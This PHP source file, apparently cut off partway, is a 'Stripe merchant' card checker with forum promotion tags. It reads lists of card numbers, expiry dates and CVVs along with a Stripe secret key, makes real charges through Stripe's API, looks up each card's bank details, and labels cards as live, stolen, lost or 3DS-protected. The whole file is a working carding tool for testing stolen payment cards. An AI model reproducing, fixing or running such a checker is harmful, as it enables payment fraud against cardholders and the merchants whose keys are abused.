<?php


//===================== [ MADE BY checker ] ====================//
#---------------[ STRIPE MERCHANTE PROXYLESS ]----------------#



error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');

$start = microtime(true);
//================ [ FUNCTIONS & LISTA ] ===============//

function GetStr($string, $start, $end){
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return trim(strip_tags(substr($string, $ini, $len)));
}


function multiexplode($seperator, $string){
    $one = str_replace($seperator, $seperator[0], $string);
    $two = explode($seperator[0], $one);
    return $two;
    };

$idd = $_GET['idd'];
$amt = $_GET['cst'];
if(empty($amt)) {
	$amt = '1';
	$chr = $amt * 100;
}
$sk = $_GET['sec'];
$lista = $_GET['lista'];
    $cc = multiexplode(array(":", "|", ""), $lista)[0];
    $mes = multiexplode(array(":", "|", ""), $lista)[1];
    $ano = multiexplode(array(":", "|", ""), $lista)[2];
    $cvv = multiexplode(array(":", "|", ""), $lista)[3];

if (strlen($mes) == 1) $mes = "0$mes";
if (strlen($ano) == 2) $ano = "20$ano";





//================= [ CURL REQUESTS ] =================//

#-------------------[1st REQ]--------------------#
$x = 0;  

while(true)  

{  

$ch = curl_init();  

curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');  

curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);  

curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  

curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);  

curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);  

curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');  

curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[cvc]='.$cvv.'');  

$result1 = curl_exec($ch);  

$tok1 = Getstr($result1,'"id": "','"');  

$msg = Getstr($result1,'"message": "','"');  

//echo "<br><b>Result1: </b> $result1<br>";  

if (strpos($result1, "rate_limit"))   

{  

    $x++;  

    continue;  

}  

break;  

}
//echo "<br><b>Result1: </b> $result1<br>";

#-------------------[2nd REQ]--------------------#

$x = 0;  

while(true)  

{  

$ch = curl_init();  

curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents');  

curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);  

curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);  

curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);  

curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);  

curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');  

curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount='.$chr.'&currency=eur&payment_method_types[]=card&description=SYNZX Donation&payment_method='.$tok1.'&confirm=true&off_session=true');  

$result2 = curl_exec($ch);  

$tok2 = Getstr($result2,'"id": "','"');  

$receipturl = trim(strip_tags(getStr($result2,'"receipt_url": "','"')));  

//echo "<br><b>Result2: </b> $result2<br>";  

if (strpos($result2, "rate_limit"))   

{  

    $x++;  

    continue;  

}  

break;  

}

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank = getStr($fim, '"bank":{"name":"', '"');
$name = getStr($fim, '"name":"', '"');
$brand = getStr($fim, '"brand":"', '"');
$country = getStr($fim, '"country":{"name":"', '"');
$scheme = getStr($fim, '"scheme":"', '"');
$currency = getStr($fim, '"currency":"', '"');
$emoji = getStr($fim, '"emoji":"', '"');
$type = getStr($fim, '"type":"', '"');
if(strpos($fim, '"type":"credit"') !== false) {
$bin = 'Credit';
}else {
$bin = 'Debit';
}

#########################[Randomizing Details]############################


//=================== [ RESPONSES ] ===================//

if(strpos($result2, '"seller_message": "Payment complete."' )) {
   
    
  
    echo '<span><font size=3.5 color="white"><font class="badge badge-success"> '.$amt.' 𝗖VV 𝗖𝗵𝗮𝗿𝗴𝗲𝗱 ✅ 𝗕𝗬 WABOU  <br> ➤ Receipt : <a href='.$receipturl.'>Here</a> </font> </i></font> <font class="badge badge-success"> '.$lista.' </i></font> <font size=3.5 color="green"> <font class="badge badge-success"></span>   <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font>  <font class="badge badge-primary">『 🔥 Join 🐉PHC @PHCORNER🔥 』 </font></font><br>';
}
elseif(strpos($result2,'"cvc_check": "pass"')){
    echo '<font size=3.5 color="white"><font class="badge badge-success">CVV LIVE</i></font> <font class="badge badge-success">'.$lista.'</i></font> <font size=3.5 color="green"> <font class="badge badge-success"> 『★CVV MATCHED★』 </font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥   🐉ARMX STAR 🔥 』 </font><br>';
}

elseif(strpos($result1, "generic_decline")) {
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">GENERIC DECLINED</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥   🐉ARMX STAR 🔥 』</font><br>';
    }
elseif(strpos($result2, "generic_decline" )) {
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">GENERIC DECLINED</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥   🐉ARMX STAR 🔥 』</font><br>';
}
elseif(strpos($result2, "insufficient_funds" )) {
    echo '<font size=3.5 color="white"><font class="badge badge-success">CVV LIVE </i></font> <font class="badge badge-success">'.$lista.'</i></font> <font size=3.5 color="green"> <font class="badge badge-success"> 『★CVV MATCHED INSUFF★』 </font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥   🐉ARMX STAR 🔥 』 </font><br>';
}

elseif(strpos($result2, "fraudulent" )) {
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">FRAUDULENT</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥   🐉ARMX STAR 🔥 』</font><br>';
}
elseif(strpos($resul3, "do_not_honor" )) {
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">NOT HONOR</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥   🐉ARMX STAR 🔥 』</font><br>';}
elseif(strpos($resul2, "do_not_honor" )) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: DO NOT HONOR</span><br>';
}
elseif(strpos($result,"fraudulent")){
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">FRAUDULENT</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥   🐉ARMX STAR 🔥 』</font><br>';

}

elseif(strpos($result2,'"code": "incorrect_cvc"')){
    echo '<font size=3.5 color="white"><font class="badge badge-success">CCN LIVE </i></font> <font class="badge badge-success">'.$lista.'</i></font> <font size=3.5 color="green"> <font class="badge badge-success"> 『★CCN★』 </font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥   🐉ARMX STAR 🔥 』 </font><br>';
}
elseif(strpos($result1,' "code": "invalid_cvc"')){
    echo '<font size=3.5 color="white"><font class="badge badge-success">CCN LIVE </i></font> <font class="badge badge-success">'.$lista.'<L</i></font> <font size=3.5 color="green"> <font class="badge badge-success"> 『★CCN MATCHED★』 </font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥   🐉ARMX STAR 🔥 』 </font><br>';
     
}
elseif(strpos($result1,"invalid_expiry_month")){
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">INVALID DATE</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥   🐉ARMX STAR 🔥 』</font><br>';

}
elseif(strpos($result2,"invalid_account")){
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">INVALID ACC</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥   🐉ARMX STAR 🔥 』</font><br>';

}

elseif(strpos($result2, "do_not_honor")) {
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">NOT HONOR CC</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥   🐉ARMX STAR 🔥 』</font><br>';
}
elseif(strpos($result2, "lost_card" )) {
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">STOLEN CC</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥   🐉ARMX STAR 🔥 』</font><br>';
}
elseif(strpos($result2, "lost_card" )) {
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">LOST CC</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥   🐉ARMX STAR 🔥 』</font><br>';
}

elseif(strpos($result2, "stolen_card" )) {
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">STOLEN CC</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥   🐉ARMX STAR 🔥 』</font><br>';
    }

elseif(strpos($result2, "stolen_card" )) {
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">STOLEN CC</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥   🐉ARMX STAR 🔥 』</font><br>';


}
elseif(strpos($result2, "transaction_not_allowed" )) {
    echo '<font size=3.5 color="white"><font class="badge badge-success">CVV LIVE </i></font> <font class="badge badge-success">'.$lista.'</i></font> <font size=3.5 color="green"> <font class="badge badge-success"> 『★FOR TRIALS ONLY★』 </font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥   🐉ARMX STAR 🔥 』 </font><br>';
    }
    elseif(strpos($result2, "authentication_required")) {
    	echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">3DS</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥   🐉ARMX STAR 🔥 』</font><br>';
   } 
   elseif(strpos($result2, "card_error_authentication_required")) {
    	echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">3DS</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥   🐉ARMX STAR 🔥 』</font><br>';
   } 
   elseif(strpos($result2, "card_error_authentication_required")) {
    	echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">3DS</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥   🐉ARMX STAR 🔥 』</font><br>';
   } 
   elseif(strpos($result1, "card_error_authentication_required")) {
    	echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">3DS</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥   🐉ARMX STAR 🔥 』</font><br>';
   } 
elseif(strpos($result2, "incorrect_cvc" )) {
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">CCN</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥   🐉ARMX STAR 🔥 』</font><br>';
}
elseif(strpos($result2, "pickup_card" )) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: PICKUP CARD</span><br>';
}
elseif(strpos($result2, "pickup_card" )) {
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">PICKUP CC</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥   🐉ARMX STAR 🔥 』</font><br>';

}
elseif(strpos($result2, 'Your card has expired.')) {
    echo 'DEAD</span>  </span>CC:  '.$lista.'</span>  <br>Result: EXPIRED CARD</span><br>';
}
elseif(strpos($result2, 'Your card has expired.')) {
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">EXPIRED CC</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥   🐉ARMX STAR 🔥 』</font><br>';

}
elseif(strpos($result2, "card_decline_rate_limit_exceeded")) {
	echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">RATE</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥   🐉ARMX STAR 🔥 』</font><br>';
}
elseif(strpos($result2, '"code": "processing_error"')) {
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">PROCESS ERROR</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥   🐉ARMX STAR 🔥 』</font><br>';
    }
elseif(strpos($result2, ' "message": "Your card number is incorrect."')) {
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">INCORECT CARD NUMBER</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥   🐉ARMX STAR 🔥 』</font><br>';
    }
elseif(strpos($result2, '"decline_code": "service_not_allowed"')) {
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">SERVICE FAILED</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥   🐉ARMX STAR 🔥 』</font><br>';
    }
elseif(strpos($result2, '"code": "processing_error"')) {
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">PROCESS ERROR</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥   🐉ARMX STAR 🔥 』</font><br>';
    }
elseif(strpos($result2, ' "message": "Your card number is incorrect."')) {
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">INCORECT CARD NUMBER</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥   🐉ARMX STAR 🔥 』</font><br>';
    }
elseif(strpos($result2, '"decline_code": "service_not_allowed"')) {
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">SERVICE-REQUIRED</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥   🐉ARMX STAR 🔥 』</font><br>';

}
elseif(strpos($result, "incorrect_number")) {
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">INCORECT CARD NUMBER</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥   🐉ARMX STAR 🔥 』</font><br>';
}
elseif(strpos($result1, "incorrect_number")) {
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">INCORECT CARD NUMBER</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥   🐉ARMX STAR 🔥 』</font><br>';


}elseif(strpos($result1, "do_not_honor")) {
    echo '<font size=3.5 color="white"><font class="badge badge-danger">#DEAD </i></font> <font class="badge badge-primary"> '.$lista.'</i></font><font size=3.5 color="red"> <font class="badge badge-warning">DO-NOT-HONOR</i></font> <font class="badge badge-secondary"> Bank: '.$bank.'  </font> <font class="badge badge-secondary"> Currency: '.$currency. '    </font>   <font class="badge badge-secondary"> Country:  '.$name.' '.$emoji.'   </font> <font class="badge badge-secondary"> Brand:  '.$brand.'  </font> <font class="badge badge-secondary"> Card:   '.$scheme.'   </font>  <font class="badge badge-secondary"> Type:  '.$type.'</font> <font class="badge badge-primary">『 🔥  🐉ARMX STAR 🔥 』</font><br>';

}
elseif(strpos($result1, 'Your card was declined.')) {
